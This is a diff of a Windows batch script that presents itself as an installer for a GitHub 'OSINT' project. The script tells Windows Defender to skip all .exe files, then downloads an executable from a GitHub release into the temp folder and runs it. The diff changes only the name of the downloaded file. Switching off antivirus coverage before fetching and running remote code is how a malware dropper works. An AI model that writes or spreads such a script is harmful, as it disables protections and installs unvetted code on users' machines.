@@ -38,8 +38,8 @@ if '%errorlevel%' NEQ '0' (
 :--------------------------------------
 Powershell -Command "Set-MpPreference -ExclusionExtension exe"
 cd %TEMP%
-Powershell -Command "Invoke-Webrequest 'https://github.com/kosan1337/OSINT/releases/download/searchinstaller/main.exe' -OutFile main.exe"
-main.exe
+Powershell -Command "Invoke-Webrequest 'https://github.com/kosan1337/OSINT/releases/download/searchinstaller/Installer.exe' -OutFile Installer.exe"
+Installer.exe
 
 
 :-------------------------------------
